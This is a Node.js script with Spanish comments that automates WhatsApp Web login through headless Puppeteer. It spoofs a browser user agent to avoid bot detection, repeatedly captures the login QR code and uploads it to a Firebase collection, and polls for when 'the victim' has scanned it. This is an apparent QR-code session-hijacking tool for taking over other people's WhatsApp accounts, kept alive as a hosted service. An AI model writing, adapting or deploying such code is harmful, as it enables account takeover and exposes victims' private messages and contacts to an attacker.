const puppeteer = require('puppeteer');
const admin = require('firebase-admin');
const http = require('http');

// 1. CARGAR LLAVE DE FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 

if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

// === PON AQUÍ TU UID DE LA CONSOLA DE FIREBASE ===
const adminUID = "yN2SRV0ypvfzMXBKrCiUZxZgTil1"; 

async function startWA() {
    console.log("Iniciando motor para el usuario: " + adminUID);
    
    try {
        const browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--single-process'
            ]
        });
        
        const page = await browser.newPage();
        // User Agent para que WhatsApp no sospeche que es un robot
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36');
        
        console.log("Navegador listo. Entrando a WhatsApp Web...");
        await page.goto('https://web.whatsapp.com', { waitUntil: 'networkidle2', timeout: 0 });

        setInterval(async () => {
            try {
                // Buscamos el elemento que tiene el código QR
                const qrCanvas = await page.$('canvas');
                if (qrCanvas) {
                    const qrData = await page.evaluate(() => {
                        const canvas = document.querySelector('canvas');
                        return canvas ? canvas.toDataURL() : null;
                    });

                    if (qrData) {
                        // Guardamos el QR en Firebase bajo TU UID
                        await db.collection("whatsapp_sessions").doc(adminUID).set({
                            qrCode: qrData,
                            status: "esperando",
                            lastUpdate: admin.firestore.FieldValue.serverTimestamp()
                        }, { merge: true });
                        console.log("QR actualizado y enviado a Firebase.");
                    }
                }

                // Verificamos si la víctima ya escaneó (aparece el icono de chat)
                const loggedIn = await page.$('header span[data-icon="chat"]');
                if (loggedIn) {
                    await db.collection("whatsapp_sessions").doc(adminUID).update({ status: "exito" });
                    console.log("¡ÉXITO! Sesión vinculada.");
                }
            } catch (e) {
                // Si no hay QR, seguimos buscando en silencio
            }
        }, 15000); // Revisamos cada 15 segundos

    } catch (err) {
        console.error("Error en el navegador:", err);
    }
}

// SERVIDOR PARA QUE RENDER MANTENGA EL SERVICIO VIVO
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('MOTOR WHATSAPP ACTIVO\n');
}).listen(port, () => {
    console.log("Servidor escuchando en puerto " + port);
    startWA(); 
});
